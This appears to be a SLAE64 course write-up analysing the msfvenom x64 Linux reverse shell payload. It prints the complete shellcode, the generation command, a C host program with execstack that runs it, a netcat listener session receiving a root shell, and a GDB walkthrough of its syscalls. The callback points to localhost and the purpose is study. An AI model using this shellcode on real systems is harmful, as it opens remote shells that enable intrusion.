---
title: SLAE64 Assignment 5 - MSFVenom Reverse Shell Analysis
date: 2020-4-26
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)

# Overview
For the fifth assignment of the SLAE64, I analyzed three payloads from msfvenom. This is the second payload, `linux/x64/shell_reverse_tcp`.

# Reverse Shell Anaylsis
We will be analyzing the msfvenom non-staged reverse shell payload. 

## Setting the Payload Options
With MSF Venom we can check the options available for our payload by passing the `--list-options` flag.
```bash
root# msfvenom -v shellcode -f c -p linux/x64/shell_reverse_tcp --list-options

Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port
```
+ We will set the `LHOST` to the IP address `127.1.1.1`. 
  - This is effectively our `localhost` interface which will work for our analysis.

## Generating the MSFVenom Payload
Here we generate the payload on Kali Linux and output it to the C format. This allows us to easy add it to our host shellcode.c program.
```bash
root# msfvenom -v shellcode -f c -p linux/x64/shell_reverse_tcp LHOST='127.1.1.1'
Payload size: 74 bytes
unsigned char shellcode[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x7f\x01\x01\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
```
+ Right off the bat we can see that `\x7f\x01\x01\x01' is clearly our IP address `127.1.1.1`.

## Shellcode.c Host Program
Here we add our shellcode to our C host program. We will compile our host program, and then use GDB for analysis of the non-staged reverse shell payload.

```c
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x7f\x01\x01\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
int main()
{
        int (*ret)() = (int(*)())shellcode;
        ret();
}
```

### Compile & Test Shellcode.c
Start a netcat listener on port 4444 before executing the reverse shell shellcode.
#### Terminal 1
```bash
root# gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
root# ./shellcode

```

#### Terminal 2
```bash
root# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 59182
id
uid=0(root) gid=0(root) groups=0(root)
```

## GDB Analysis
### Setup
Here we will start our shellcode with the Gnu Debugger and set a breakpoint on the main function. After the breakpoint is set, we will run the program. 
```bash
root# gdb ./shellcode
GNU gdb (Debian 8.3.1-1) 8.3.1
gdb-peda$ b main
Breakpoint 1 at 0x1129
gdb-peda$ r
```

### Finding shellcode[]
We will use the GDB step-into (`s`) command to move through our program until we reach the point where execution is passed to the shellcode[] array (our non-staged reverse shell shellcode from msfvenom).
```bash
=> 0x555555555141 <main+28>:    call   rdx
gdb-peda$ s
```
+ Step into rdx (shellcode[]).

## Dumping MSFVenom Reverse Shell Assembly Instructions
With the instruction pointer (RIP) on the first instruction of `shellcode`, dump the instructions of the entire payload.
```bash
=> 0x555555558040 <shellcode>:  push   0x29
   0x555555558042 <shellcode+2>:        pop    rax
   0x555555558043 <shellcode+3>:        cdq
   0x555555558044 <shellcode+4>:        push   0x2
   0x555555558046 <shellcode+6>:        pop    rdi
   0x555555558047 <shellcode+7>:        push   0x1
   0x555555558049 <shellcode+9>:        pop    rsi
   0x55555555804a <shellcode+10>:       syscall
   0x55555555804c <shellcode+12>:       xchg   rdi,rax
   0x55555555804e <shellcode+14>:       movabs rcx,0x101017f5c110002
   0x555555558058 <shellcode+24>:       push   rcx
   0x555555558059 <shellcode+25>:       mov    rsi,rsp
   0x55555555805c <shellcode+28>:       push   0x10
   0x55555555805e <shellcode+30>:       pop    rdx
   0x55555555805f <shellcode+31>:       push   0x2a
   0x555555558061 <shellcode+33>:       pop    rax
   0x555555558062 <shellcode+34>:       syscall
   0x555555558064 <shellcode+36>:       push   0x3
   0x555555558066 <shellcode+38>:       pop    rsi
   0x555555558067 <shellcode+39>:       dec    rsi
   0x55555555806a <shellcode+42>:       push   0x21
   0x55555555806c <shellcode+44>:       pop    rax
   0x55555555806d <shellcode+45>:       syscall
   0x55555555806f <shellcode+47>:       jne    0x555555558067 <shellcode+39>
   0x555555558071 <shellcode+49>:       push   0x3b
   0x555555558073 <shellcode+51>:       pop    rax
   0x555555558074 <shellcode+52>:       cdq
   0x555555558075 <shellcode+53>:       movabs rbx,0x68732f6e69622f
   0x55555555807f <shellcode+63>:       push   rbx
   0x555555558080 <shellcode+64>:       mov    rdi,rsp
   0x555555558083 <shellcode+67>:       push   rdx
   0x555555558084 <shellcode+68>:       push   rdi
   0x555555558085 <shellcode+69>:       mov    rsi,rsp
   0x555555558088 <shellcode+72>:       syscall
   0x55555555808a <shellcode+74>:       add    BYTE PTR [rax],al
gdb-peda$ x/35i $rip
```

## Socket System Call
```bash
<shellcode>:          push   0x29
<shellcode+2>:        pop    rax
<shellcode+3>:        cdq
<shellcode+4>:        push   0x2
<shellcode+6>:        pop    rdi
<shellcode+7>:        push   0x1
<shellcode+9>:        pop    rsi
<shellcode+10>:       syscall
 
```
+ In the first 3 commands we can see that rax is set to 0x29. 
  - This is the system call number for `socket`.
+ `cdq` is used to clear out the `rdx` register 
  - set it to `0x0` aka `NULL`
+ `rdi` is set to `0x2` which is `AF_INET`
+ `rsi` is set to `0x1` which is `SOCK_STREAM`

## Connect System Call
```bash
<shellcode+12>:       xchg   rdi,rax 
```
+ Here we see the socket file descriptor returned from the socket system call, passed to the connect system call.

```bash
<shellcode+14>:       movabs rcx,0x101017f5c110002
<shellcode+24>:       push   rcx
<shellcode+25>:       mov    rsi,rsp
```
+ This is the struct for the socket address.
  + `0002` is `AF_INET`
  + `5c11` is for TCP Port `4444`
  + `0101017f` is for the IP address `127.1.1.1` 

```bash
<shellcode+28>:       push   0x10
<shellcode+30>:       pop    rdx
```
+ `rdx` is equal to the size of the struct. 
  - 16 bytes in decimal, or `0x10` in hex.

```bash
<shellcode+31>:       push   0x2a
<shellcode+33>:       pop    rax
<shellcode+34>:       syscall
 ```
+ This is the system call number for connect, `0x2a`, which must be in the `rax` register at the time of the system call.


## Dup2 Loop
This is the dup2 system call loop to pass standard input, output, and error to the remote connection.
```bash
<shellcode+36>:       push   0x3
<shellcode+38>:       pop    rsi
<shellcode+39>:       dec    rsi
<shellcode+42>:       push   0x21
<shellcode+44>:       pop    rax
<shellcode+45>:       syscall
<shellcode+47>:       jne    <shellcode+39>
```
+ `0x21` is the system call for dup2.

## Execve 
Here we see the execve system call which will spawn a shell after establishing a remote connection.
```bash
<shellcode+49>:       push   0x3b
<shellcode+51>:       pop    rax
<shellcode+52>:       cdq
```
+ set `rax` to the system call number for `execve`.
+ `cdq` clears the `rdx` register.

```bash
RDI: 0x7fffffffe0e8 --> 0x68732f6e69622f ('/bin/sh')

<shellcode+53>:       movabs rbx,0x68732f6e69622f
<shellcode+63>:       push   rbx
<shellcode+64>:       mov    rdi,rsp
<shellcode+67>:       push   rdx
```
+ Here we see `rdi` set to the memory address of the null terminated string `/bin/sh`.

```bash
RSI: 0x7fffffffe0d8 --> 0x7fffffffe0e8 --> 0x68732f6e69622f ('/bin/sh')

<shellcode+68>:       push   rdi
<shellcode+69>:       mov    rsi,rsp
```
+ Here we see `rsi` set to be a pointer to a pointer for the string `/bin/sh`.

```bash
<shellcode+72>:       syscall
<shellcode+74>:       add    BYTE PTR [rax],al
```
+ And finally, this is our reverse shell spawning the shell for the connection.

